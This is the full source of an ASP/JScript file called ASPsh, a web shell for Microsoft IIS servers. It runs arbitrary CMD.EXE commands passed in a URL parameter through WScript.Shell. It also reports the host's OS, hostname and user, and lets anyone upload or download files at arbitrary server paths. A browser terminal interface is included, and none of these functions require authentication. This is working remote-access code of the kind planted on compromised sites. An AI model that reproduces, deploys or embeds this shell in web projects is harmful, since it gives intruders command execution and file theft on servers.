<% @language="javascript" %>
<SCRIPT language="VBScript" runat="server">
	' Stuff that should have been available in UNICODE through some IIS object
	' but has to be done in VBScript, sigh...
	Function Request_RawData()
		Dim vArray, sResult, I
		vArray = Request.BinaryRead(Request.TotalBytes)
		sResult = ""
		For I = 1 To LenB(vArray)
			sResult = sResult & ChrW(AscB(MidB(vArray, I, 1)))
		Next
		Request_RawData = sResult
	End Function
	Function Response_RawData(sString)
		Dim vArray, I
		vArray = ""
		For I = 1 To Len(sString)
			vArray = vArray & ChrB(Asc(Mid(sString, I, 1)))
		Next
		Response.BinaryWrite(vArray)
	End Function
</SCRIPT>
<SCRIPT language="JavaScript" runat="server">
  /****************************************************************************
    Stuff that should have been in the JavaScript language in the first place
  ****************************************************************************/
	// Turn the given string into HTML by replacing any control characters
	// with their HTML encoded equivalent, such as replacing '\n' with "<BR>"
	function HTMLencode(sText) {
		return sText.replace(/[\<\>\"\&\r\n \t]/g, function (sChar, iIndex) {
			switch (sChar) {
				case '\r': return "";
				case '\n': return "<BR>";
				case ' ':  return "&nbsp;";
				case '\t': return "&nbsp;&nbsp;&nbsp;&nbsp;";
				default:   return "&#" + sChar.charCodeAt(0) + ";";
			}
		});
	}
	// Turn the given string into a JS string by replacing anything that breaks
	// compilation, is not ASCII or terminates the string with an encoded char,
	// such as replacing '\n' with "\x0D".
	function JSencode(sText) {
		return sText.replace(/[\x00-\x1F\"\'\\\u0100-\uFFFF]/g, function (c) {
			var sic = c.charCodeAt(0).toString(16);
			if (sic.length == 1)   return "\\x0" + sic;
			if (sic.length == 2)   return "\\x" + sic;
			if (sic.length == 3)   return "\\u0" + sic;
			                       return "\\u" + sic;
		});
	}
  /****************************************************************************
    Stuff that should have been in the IIS Objects in the first place.
  ****************************************************************************/
	// Return the value of a GET variable or a default value if it's either not
	// supplied or there is more than one such value.
	function getVar(sName, sDefault) {
		var oGetVar = Request.QueryString(sName);
		return (oGetVar.Count == 1 ? unescape(oGetVar(1)) : sDefault);
	}
	// Return the value of a cookie variable or a default value if it's either
	// not present or there is more than one such value.
	function getCookie(sName, sDefault) {
		var oCookieVar = Request.Cookies(escape(sName));
		return oCookieVar != "" ? unescape(oCookieVar) : sDefault;
	}
	// Handle the POST data the way it should have been done by IIS.
	var gaPOST = [];
	if (
		Request.ServerVariables("REQUEST_METHOD") == "POST" && 
		Request.TotalBytes > 0
	) {
		// Convert the bytes to a unicode string we can manipulate in JavaScript
		// Whomever designed this never really envisioned UNICODE if you ask me,
		// but unfortunately it's what we have to work with, so we'll have to 
		// convert this to UNICODE using VBScript.
		var sRequest = Request_RawData();
		// We're assuming our data is encoded using multipart-formdata, but
		// we'll check to make sure it makes sense:
		var sCRLF = "\r\n";
		var iEndSeperator = sRequest.indexOf(sCRLF);
		if (iEndSeperator >= 0) { // A CRLF is required for our handler to work
			// Find out what seperates each part of the data:
			var sSeperator = sRequest.substr(0, iEndSeperator);
			// And cut our data into portions using it:
			var asRequest = sRequest.split(sSeperator);
			// Because the data starts and ends with a seperator, the first and
			// last element of our array do not contain any data. We can use
			// this as a sanity check:
			if (asRequest.length >= 3) {
				asRequest.shift(); // Discard the first...
				asRequest.pop(); // ... and last element.
				for (var i in asRequest) {
					// Each part starts with the "\r\n" that comes after a
					// seperator, so we'll ignore that:
					var sPart = asRequest[i].substr(
						asRequest[i].indexOf(sCRLF) + sCRLF.length
					);
					// Get the information from inside the part
					var aPart = processPostPart(sPart);
					// If it processed correctly, we'll add it to the POST info:
					if (aPart != null) gaPOST[aPart.name] = aPart;
				}
			}
		}
	}
	function processPostPart(sPart) {
		// Each part in a multi-part/formdata has one or more lines of header
		// followed by a blank line, then there any number of bytes of raw data
		// followed by a CRLF. First We'll split the header from the data by
		// looking for this blank line:
		var sEndHeader = "\r\n\r\n";
		var iEndHeader = sPart.indexOf(sEndHeader);
		if (iEndHeader < 0) return null; // No blank line: bad data
		// Let's process the headers:
		var asHeaders = sPart.substr(0, iEndHeader).split("\r\n");
		// The first line must start with "Content-Disposition: form-data;"
		// followed by the name of the variable and optionally a filename.
		var rFirstLine = /^Content\-Disposition\: form\-data\; name=\"(.*?)\"(?:\; filename=\"(.*?)\")?$/;
		var oMatch = asHeaders[0].match(rFirstLine);
		if (oMatch == null) return null; // Bad data
		// Then there might be a whole load of other headers, which we'll
		// completely ignore for now... *TODO*
		// Return the information about the headers and the raw data
		return {
			name: oMatch[1], 
			filename: (oMatch.length == 2 ? null : oMatch[2]),
			data: sPart.substring(
				iEndHeader + sEndHeader.length, 
				sPart.length - 2 // -2 == CRLF
			)
		};
	}
	// Return the value of a POST variable or a default value if it's either not
	// supplied or something is wrong with the POST.
	function postVar(sName) {
		return (typeof(gaPOST[sName]) != "undefined" ? gaPOST[sName] : null);
	}

  /****************************************************************************
    Stuff that makes outputting XML data easier.
  ****************************************************************************/
	function outputXMLdata(asData) {
		Response.ContentType = "text/plain";
		for (var i in asData) {
			Response.Write(escape(i) + "=" + escape(asData[i]) + "\n");
		}
	}
	function outputXMLerror(e) {
		return outputXMLdata({
			error: (e.number == 0 ? "" : (((e.number < 0 ? 0x100000000 : 0) + e.number)).toString(16) + " ") + 
				e.message
		});
	}

  /****************************************************************************
    ASPsh can finally start doing something useful here:
  ****************************************************************************/
	var gsAppName           = "ASPsh";
	var gsAppVersion        = "v1.0";
	var gsAuthor            = "Berend-Jan &quot;SkyLined&quot; Wever";
	var gsCopyright         = "Copyright (C) 2003-2010";

	var goWSS               = new ActiveXObject("WScript.Shell");

	var gsRequest           = getVar("req", "main");
	var gsCommand           = getVar("cmd", "");
//	var gsCwd               = getVar("cwd", getCookie("cwd", new String(goWSS.CurrentDirectory)));
//	var gsCwd               = getCookie("cwd", new String(goWSS.CurrentDirectory));
	var gsCwd               = getCookie("cwd", "(unknown)");
	var giTimeout           = parseInt(getVar("timeout", "0"));
	var goUploadSource      = postVar("uploadsource");
	var goUploadDestination = postVar("uploaddestination");
	var goDownloadSource    = getVar("downloadsource");

	switch (gsRequest) {
		case "inf":      getInformation();        break;
		case "cmd":      executeCommand();        break;
		case "upload":   uploadFile();            break;
		case "download": downloadFile();          break;
		case "main":     outputMainpage();        break;
		default:         Response.Write("Error"); break;
	}
	
	function getInformation() {
		try {
			var sIISVer = Request.ServerVariables("SERVER_SOFTWARE");
			var sUsername = Request.ServerVariables("LOGON_USER");
			var sCmd = "cmd.exe /Q /C " +
				"ver" +
				"&hostname" +
				"&cd" + (sUsername == "" ? "&whoami" : "");
			var sDebug = "cmd=" + sCmd + "\n";
			var oCMD = goWSS.Exec(sCmd);
			var asStdOut = [];
			if (!oCMD.Stderr.AtEndOfStream) {
				var sStdErr = new String(oCMD.Stderr.ReadAll());
				throw new Error("Error while getting system information: " +
					"exit code = " + oCMD.ExitCode + ", stderr output:\n" + 
					sStdErr
				);
			}
			if (oCMD.ExitCode != 0) {
				throw new Error("Error while getting system information: " +
					"exit code = " + oCMD.ExitCode + ".");
			}
			if (!oCMD.Stdout.AtEndOfStream) {
				asStdOut = new String(oCMD.Stdout.ReadAll()).replace(/\r/g, "").split("\n");
			}
			sDebug += "stdout=\"" + asStdOut.join("\", \"") + "\"\n";
			var sFirstLine = asStdOut.shift();
			if (sFirstLine != "") {
				throw new Error("First line of cmd output is expect to be " +
					"empty, found \"" + sFirstLine + "\".");
			}
			var sWinVer = asStdOut.shift();
			if (!/^Microsoft Windows/.test(sWinVer)) {
				throw new Error("Second line of cmd output is expect to be " +
					"the windows version, found \"" + sWinVer + "\".");
			}
			var sHostname = asStdOut.shift();
			if (!/[^\s]/.test(sHostname)) {
				throw new Error("Third line of cmd output is expect to be " +
					"the hostname, found \"" + sHostname + "\".");
			}
			var sCwd = asStdOut.shift();
			if (!/[A-Za-z]\:\\/.test(sCwd)) {
				throw new Error("Fifth line of cmd output is expect to be " +
					"the current working directory, found \"" + sCwd + "\".");
			}
			if (sUsername == "") sUsername = asStdOut.shift();
			if (!/[^\s]/.test(sUsername)) {
				throw new Error("Sixth line of cmd output is expect to be " +
					"whoami output, found \"" + sUsername + "\".");
			}
			if (asStdOut.length != 1) {
				throw new Error("Additional lines found in cmd output: \n" + 
					asStdOut.join("\n"));
			}
			return outputXMLdata({
				"os version": sWinVer,
				"server version": sIISVer,
				"hostname": sHostname,
				"username": sUsername,
				"cwd": sCwd,
				"debug": sDebug
			});
		} catch(e) {
			return outputXMLerror(e);
		}
	}
	function getRandomString(iLength) {
		var sRandom = "";
		var sRandomChars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
		
		while (sRandom.length < iLength) sRandom += sRandomChars.charAt(Math.floor(Math.random() * sRandomChars.length));
		return sRandom;
	}
	function executeCommand() {
		try {
			var sRandom = getRandomString(0x20);
			var goWSS = new ActiveXObject("WScript.Shell");
			var gsCwdCommand = (gsCwd == "" || gsCwd == "(unknown)" ? "" :
				"(" + gsCwd.substr(0, 2) + "&cd \"" + gsCwd.substr(2) + "\")&");
			var sCmd = "CMD.EXE /Q /V:ON /C " + 
				gsCwdCommand + 
				(/^\s*$/.test(gsCommand) ? "" : "(" + gsCommand + ")&") +
				"echo " + sRandom + " !ERRORLEVEL! !CD!&exit";
			var sDebug = "cmd=" + sCmd + "\n";
			var oCMD = goWSS.Exec(sCmd);
			var iStartTime = new Date().valueOf();
			var sStdOut = "", asStdOut = [], sStdErr = "", asStdErr = [];
			var sErrorLevelAndCwd = "";
			var bDone = false;
			var iTimeout = 0;
			do {
				while (!oCMD.Stdout.AtEndOfStream) {
					var sChar = oCMD.StdOut.Read(1);
					switch (sChar) {
						case "\r": break;
						case "\n":
							if (sStdOut.substr(0, sRandom.length) == sRandom) {
								sErrorLevelAndCwd = sStdOut.substr(sRandom.length + 1);
								oCMD.Terminate();
								bDone = true;
								break;
							}
							asStdOut.push(sStdOut);
							sStdOut = "";
							break;
						default:
							sStdOut += sChar;
							break;
					}
				}
				while (!oCMD.StdErr.AtEndOfStream) {
					var sChar = oCMD.StdErr.Read(1);
					switch (sChar) {
						case "\r": break;
						case "\n":
							asStdErr.push(sStdErr);
							sStdErr = "";
							break;
						default:
							sStdErr += sChar;
							break;
					}
				}
				if (oCMD.Status != 0) {
					bDone = true;
				} else if (new Date().valueOf() < iStartTime + giTimeout * 1000) {
					goWSS.Popup("Waiting for command to finish...", 1);
				} else {
					iTimeout = Math.round((new Date().valueOf() - iStartTime) / 1000);
					bDone = true;
				}
			} while (!bDone);
			var iNow = new Date().valueOf();
			sDebug += "start=" + iStartTime + ", end=" + iNow + ", elapsed=" + (iNow-iStartTime) + ", timeout=" + giTimeout + "\n";
			sDebug += "stdout=\"" + asStdOut.join("\", \"") + "\"\n";
			sDebug += "stderr=\"" + asStdErr.join("\", \"") + "\"\n";
			var sErrorLevel = "0";
			var sCwd = gsCwd;
			if (iTimeout == 0) {
				if (!/^[0-9]+\s[A-Z]\:\\/i.test(sErrorLevelAndCwd)) {
					throw new Error("Last line of cmd output is expect to be " +
						"the errorlevel and current working directory, found " +
						"\"" + sErrorLevelAndCwd + "\".");
				}
				sDebug += "lastline=\"" + sErrorLevelAndCwd + "\"\n";
				var iSpaceIndex = sErrorLevelAndCwd.indexOf(" ");
				sDebug += "spaceindex=" + iSpaceIndex + "\n";
				var sErrorLevel = sErrorLevelAndCwd.substr(0, iSpaceIndex);
				var sCwd        = sErrorLevelAndCwd.substr(iSpaceIndex + 1);
			}
			return outputXMLdata({
				"cwd": sCwd,
				"errorlevel": sErrorLevel,
				"stdout": asStdOut.join("\n"),
				"stderr": asStdErr.join("\n"),
				"timeout": iTimeout,
				"debug": sDebug
			});
		} catch(e) {
			return outputXMLerror(e);
		}
	}
	
	function uploadFile() {
		if (
			goUploadSource == null || 
			goUploadSource.filename == null ||
			goUploadSource.data == null ||
			goUploadDestination == null || 
			goUploadDestination.data == null
		) {
			return outputTransferStatus(
				false,
				"Upload: POST data is missing information.<BR>"
			);
		}
		var sSourcePath = goUploadSource.filename;
		var sFilename = sSourcePath.lastIndexOf("\\") < 0 ? sSourcePath :
			sSourcePath.substr(sSourcePath.lastIndexOf("\\") + 1);
		var sDestinationPath = goUploadDestination.data;
		if (sDestinationPath == "") sDestinationPath = gsCwd;
		var sFileData = goUploadSource.data;
		
		// Check if the target path is a directory and if so, add the uploaded
		// filename to the target path:
		var oFSO = new ActiveXObject("Scripting.FileSystemObject");
		if (
			/\\$/.test(sDestinationPath) || // Ends with slash "\"
			oFSO.FolderExists(sDestinationPath)
		) {
			if (sFilename == "") {
				return outputTransferStatus(
					false,
					"Upload: No filename specified.<BR>"
				);
			}
			if (sDestinationPath.charAt(sDestinationPath.length - 1) != "\\") {
				sDestinationPath += "\\";
			}
			sDestinationPath += sFilename;
		}
		// Now we need to safe the file to disk. ADODB.Stream is used because
		// Scripting.FileSystemObject behaved bad for unknown reasons. I had
		// some issues getting this correct, because writing binary files did
		// not work for unknown reasons. So I write to text files, using a
		// character set that doesn't translate any character. This effectively
		// makes it equal to a binary write: problem solved.
		try {
			var oAS = new ActiveXObject("ADODB.Stream");
			oAS.Mode = 3; // ReadWrite
			oAS.Type = 2; // 2 = Text, 1= Binary
			oAS.Charset = "ISO-8859-1"; // No translation of characters
			oAS.Open(); // Open the stream
			oAS.WriteText(goUploadSource.data); // Write the data
			oAS.SaveToFile(sDestinationPath, 2); // Save to our destination
			oAS.Close();
		} catch (e) {
			return outputTransferStatus(
				false,
				"Upload: Error writing file" +
				" \"" + sSourcePath + "\" to" +
				" \"" + sDestinationPath + "\"" +
				" : " + e.message + "<BR>"
			);
		}
		outputTransferStatus(
			true,
			"Successfully uploaded" +
			" \"" + sSourcePath + "\" to" +
			" \"" + sDestinationPath + "\"" +
			" (" + goUploadSource.data.length + " bytes)<BR>"
		);
	}
	function downloadFile() {
		var sSourcePath = (
			goDownloadSource == null ||
			goDownloadSource == ""
		? "" : goDownloadSource);
		if (sSourcePath == "") {
			return outputTransferStatus(
				false,
				"Download: No filename specified"
			);
		}
		var sFilename = sSourcePath;
		// If a path is not supplied, use the CWD from the cookie. Otherwise, 
		// cut the path from the filename varaible.
		if (sSourcePath.lastIndexOf("\\") < 0) {
			sSourcePath = gsCwd + 
				(gsCwd.charAt(gsCwd.length - 1) == "\\" ? "" : "\\") + 
				sFilename;
		} else {
			sFilename = sSourcePath.substr(sSourcePath.lastIndexOf("\\") + 1);
		}
		var sBuffer = null;
		try {
			var oAS = new ActiveXObject("ADODB.Stream");
			oAS.Mode = 3; // ReadWrite
			oAS.Type = 2; // 2 = Text, 1= Binary
			oAS.Charset = "ISO-8859-1"; // No translation of characters
			oAS.Open(); // Open the stream
			oAS.LoadFromFile(sSourcePath); // Load our file into the buffer
			sBuffer = oAS.ReadText();
			oAS.Close();
		} catch (e) {
			return outputTransferStatus(
				false,
				"Download: Error reading file" +
				" \"" + sSourcePath + "\" " +
				" : " + e.message + "<BR>"
			);
		}
		Response.addHeader("Content-Disposition", "attachment; filename=" + sFilename);
		Response.addHeader("Content-Length", sBuffer.length);
		Response.ContentType = "application/octet-stream"; // generic stuff
		Response_RawData(sBuffer); // Output the buffer
	}	
</SCRIPT>

<% function outputTransferStatus(bSuccess, sStatus)  { %>
	<SCRIPT type="text/JavaScript" language="JavaScript">
		parent.document.getElementById("output").innerHTML += 
			"<BR><%=bSuccess ? JSencode(sStatus) : JSencode("<SPAN class=\"stderr\">" + sStatus + "</SPAN>")%>";
	</SCRIPT>
<% } %>

<% function outputMainpage() { %>
<HTML>
	<HEAD>
	<TITLE><%=gsAppName%>&nbsp;<%=gsAppVersion%> loading...</TITLE>
		<STYLE>
		* {
			text-overflow: ellipsis;
			vertical-align: top;
		}
		TABLE,TR,TD, FORM {
			margin:0px; padding: 0px; border:0px; border-spacing:0px;
		}
		FIELDSET {
			width: 100%;
		}
		LEGEND {
			padding-right: 7px;
		}
		.button {
			border: 2px outset ButtonFace;  margin-left:2px;
			font: 9pt Arial;
 			color:black; background:ButtonFace;
		}
		.buttonwidth {
 			width: 80px;
 		}
		.input1 { 
			margin-top:-1px;
		}
		.inset {
			border: 2px inset ButtonFace; 
		}
		.cmd {
			font: 9pt Courier New, Courier; 
			color:white; 
			background:black;
		}
		.highlight { color: white; background:transparent; }
		.stdout { color: silver; background:transparent; }
		.stderr { color: red; background:transparent; }
		.debug {
			xdisplay: none; /* uncomment if you want to see this */
			color: gray;
			background:transparent; 
		}
	</STYLE>
	</HEAD>
	<BODY onLoad="return body_onload();" onKeyDown="return body_onkeydown();">
		<FIELDSET>
			<LEGEND id="title">Loading...</LEGEND>
			<DIV class="inset cmd">
				<SPAN id="output" class="cmd"></SPAN><BR>
				<FORM onSubmit="return form_onsubmit()">
				<TABLE cellspacing=0 cellpassing=0 style="width:100%;"><TR>
					<TD><NOBR style="width:100%;" class="cmd stdout" id="prompt"></NOBR></TD>
					<TD style="width:100%;"><INPUT style="width:100%; margin: 0px; padding: 0px; margin-top:-1px; border:0px;" class="cmd" type="text" id="input"></TD>
				</TR></TABLE>
				</FORM>
			</DIV>
		</FIELDSET>
		<FIELDSET>
			<LEGEND id="title">Up-/Download center</LEGEND>
			<TABLE cellspacing=2 cellpassing=0 style="width:100%;"><TR>
				<FORM enctype="multipart/form-data" method="post" action="?req=upload" target="transferFrame">
				<TD><NOBR style="width:100%;">Upload from:</NOBR></TD>
				<TD style="width:100%;" colspan="2"><INPUT type="file" style="width:100%;" name="uploadsource" id="uploadFrom"></TD>
			</TR><TR>
				<TD><NOBR style="width:100%;">Upload to:</NOBR></TD>
				<TD style="width:100%;"><INPUT type="text" style="width:100%;" name="uploaddestination" id="uploadTo"></TD>
				<TD class="buttonwidth"><INPUT type="submit" class="buttonwidth" value="Upload" id="uploadButton"></TD>
				</FORM>
			</TR><TR>
				<FORM method="get" action="?" target="transferFrame">
					<INPUT type="hidden" name="req" value="download">
				<TD><NOBR style="width:100%;">Download from:</NOBR></TD>
				<TD style="width:100%;"><INPUT type="text" style="width:100%;" name="downloadsource" id="downloadFrom"></TD>
				<TD class="buttonwidth"><INPUT type="submit" class="buttonwidth" value="Download" id="downloadButton"></TD>
				</FORM>
			</TR></TABLE>
		</FIELDSET>
		<IFRAME id="focus" style="display:none" name="transferFrame"></IFRAME><BR>
		<SPAN id="debug" class="debug"></SPAN>
	</BODY>
	<SCRIPT type="text/JavaScript" language="JavaScript">
		var gbLoaded = false;
		var goTitle = document.getElementById("title");
		var goOutput = document.getElementById("output");
		var goPrompt = document.getElementById("prompt");
		var goInput = document.getElementById("input");
		var goFocus = document.getElementById("focus");
		var goUploadFrom = document.getElementById("uploadFrom");
		var goUploadTo = document.getElementById("uploadTo");
		var goUploadButton = document.getElementById("uploadButton");
		var goDownloadFrom = document.getElementById("downloadFrom");
		var goDownloadButton = document.getElementById("downloadButton");
		var goDebug = document.getElementById("debug");
		var goFocus = document.getElementById("focus");
		var gsUrl = location.protocol + "//" + location.host + location.pathname;
		var gsCwd = "(unknown)";
		var giTimeout = 30;
		var gaHistory = [""], giHistory = 0;
		function getXML(asData) {
			var oXML = new XMLHttpRequest();
			asQuery = [];
			for (var i in asData) {
				asQuery.push(escape(i) + "=" + escape(asData[i]));
			}
		    oXML.open("GET", gsUrl + (asQuery.length > 0 ? "?" + asQuery.join("&") : ""), false);
			oXML.send(null);
			var asResponse = new String(oXML.responseText).split("\n");
			var aResult = [];
			while (asResponse.length > 0) {
				var sLine = asResponse.pop();
				if (sLine.indexOf("=") >= 0) {
					var asLine = sLine.split("=");
					aResult[unescape(asLine[0])] = unescape(asLine[1]);
				}
			}
			return aResult;
		}
		
		function body_onload() {
			var asInformation = getXML({req:"inf"});
			var sOSVersion = "(unknown)";
			var sServerVersion = "(unknown)";
			var sHostname = "(unknown)";
			var sUsername = "(unknown)";
			var sDebug = "";
			var bError = false;
			for (var i in asInformation) {
				switch(i) {
					case "os version": sOSVersion = asInformation[i]; break;
					case "server version": sServerVersion = asInformation[i]; break;
					case "hostname": sHostname = asInformation[i]; break;
					case "username": sUsername = asInformation[i]; break;
					case "cwd": gsCwd = asInformation[i]; break;
					case "debug": sDebug += HTMLencode(asInformation[i]); break;
					default: 
						sDebug += "Unexpected: " + HTMLencode(i) + "=" + HTMLencode(asInformation[i]) + "<BR>";
						bError = true;
						// Ignore useless extra info
				}
			}
			document.title = sUsername + " @ " + sHostname;
			goTitle.innerHTML = HTMLencode("CMD.EXE " + sUsername + " @ " + sHostname);
			goOutput.innerHTML = HTMLencode(
					"<%=gsAppName%>\ <%=gsAppVersion%> on " + 
					sServerVersion + ", " + sOSVersion
				) + "<BR>" +
				"<%=gsCopyright%>&nbsp;<%=gsAuthor%>.<BR>" +
				(bError ? "<SPAN class=\"stderr\">An internal error has occured.<BR></SPAN>" : "");
			goPrompt.innerHTML = HTMLencode(gsCwd) + ">";
			goUploadTo.value = gsCwd;
			setCookie("cwd", gsCwd);
			goInput.focus();
			gbLoaded = true;
			goDebug.innerHTML = sDebug + 
				"<BR>Cookie: " + HTMLencode(JSencode(document.cookie)) + 
				"<BR>Cwd: \"" + HTMLencode(JSencode(gsCwd)) + "\"";
			return true;
		}
		
		function form_onsubmit() {
			if (gbLoaded) {
				var sOldCwd = gsCwd;
				var asInformation = getXML({
					req:"cmd", 
					cmd:goInput.value, 
					cwd:gsCwd, 
					timeout:giTimeout
				});
				var iErrorLevel = 0;
				var sStdOut = "";
				var sStdErr = "";
				var sDebug = "";
				var iTimeout = 0;
				var bError = false;
				for (var i in asInformation) {
					switch(i) {
						case "cwd": gsCwd = asInformation[i]; break;
						case "errorlevel": iErrorLevel = asInformation[i]; break;
						case "stdout": sStdOut = asInformation[i]; break;
						case "stderr": sStdErr = asInformation[i]; break;
						case "debug": sDebug += HTMLencode(asInformation[i]); break;
						case "timeout": iTimeout = parseInt(asInformation[i]); break;
						default:
							sDebug += "Unexpected: " + HTMLencode(i) + "=" + HTMLencode(asInformation[i]) + "<BR>";
							bError = true;
							// Ignore useless extra info
					}
				}
				goOutput.innerHTML += 
					"<SPAN class=\"stdout\"><BR>" + goPrompt.innerHTML + "</SPAN>" + 
						HTMLencode(goInput.value) + "<BR>" +
					"<SPAN class=\"stdout\">" + HTMLencode(sStdOut) + "</SPAN>" +
					"<SPAN class=\"stderr\">" + HTMLencode(sStdErr) + "</SPAN>" +
					(iErrorLevel != 0 ? "<SPAN class=\"stderr\">(ERROR LEVEL = " + iErrorLevel + ")<BR></SPAN>" : "") +
					(bError ? "<SPAN class=\"stderr\">An internal error has occured.<BR></SPAN>" : "") +
					(iTimeout != 0 ? "<SPAN class=\"stderr\">The command timed out after " + iTimeout + " seconds.<BR></SPAN>" : "");
				goPrompt.innerHTML = HTMLencode(gsCwd) + ">";
				setCookie("cwd", gsCwd);
				addHistory();
				goInput.value = "";
				if (sOldCwd != gsCwd && goUploadTo.value == sOldCwd) {
					goUploadTo.value = gsCwd;
				}
				goInput.focus();
				goFocus.scrollIntoView(false);
				goDebug.innerHTML = sDebug + 
					"<BR>Cookie: " + HTMLencode(JSencode(document.cookie)) + 
					"<BR>Cwd: \"" + HTMLencode(JSencode(gsCwd)) + "\"";
			}
			return false;
		}
		function body_onkeydown() {
			if (gbLoaded) {
				switch(document.activeElement) {
					case goUploadFrom:
					case goUploadTo:
					case goUploadButton:
					case goDownloadFrom:
					case goDownloadButton:
						// Don't do anything.
					break;
					case goInput:
					default:
						goInput.focus();
						switch(event.keyCode) {
							case 38: goHistory(-1); break;
							case 40: goHistory(+1); break;
							break;
						}
						event.cancelBubble = true;
					break;
				}
			}
			return true;
		}
		function addHistory() {
			if (
				/[^\s]/.test(goInput.value) && // No empty strings
				gaHistory[giHistory] != goInput.value // Only if changed
			) {
				if (giHistory != 0) {
					// 0 a B c d  (B = giHistory, E = inserted)
					var aPreHistory = gaHistory.splice(1, giHistory);
					// 0 c d         (a B = aPreHistory)
					for (var i in aPreHistory) {
						gaHistory.push(aPreHistroy[i]);
					}
					// 0 c d a B
					giHistory = 0;
				}
			}
			gaHistory.push(goInput.value);
		}
		function goHistory(iMove) {
			if (gaHistory[giHistory] != goInput.value) {
				addHistory();
				if (iMove > 0) iMove++;
			}
			giHistory += iMove;
			while (giHistory < 0) giHistory += gaHistory.length
			giHistory %= gaHistory.length
			goInput.value = gaHistory[giHistory];
		}
		function setCookie(sName, sValue) {
			document.cookie = escape(sName) + "=" + escape(sValue);
		}
		
		function HTMLencode(sText) {
			return sText.replace(/[\<\>\"\&\r\n \t]/g, function (sChar, iIndex) {
				switch (sChar) {
					case '\r': return "";
					case '\n': return "<BR>";
					case ' ':  return "&nbsp;";
					case '\t': return "&nbsp;&nbsp;&nbsp;&nbsp;";
					default:   return "&#" + sChar.charCodeAt(0) + ";";
				}
			});
		}
		function JSencode(sText) {
			return sText.replace(/[\x00-\x1F\"\'\\\u0100-\uFFFF]/g, function (c) {
				var sic = c.charCodeAt(0).toString(16);
				if (sic.length == 1)   return "\\x0" + sic;
				if (sic.length == 2)   return "\\x" + sic;
				if (sic.length == 3)   return "\\u0" + sic;
				                       return "\\u" + sic;
			});
		}
	</SCRIPT>
  </BODY>
</HTML>
<% } %>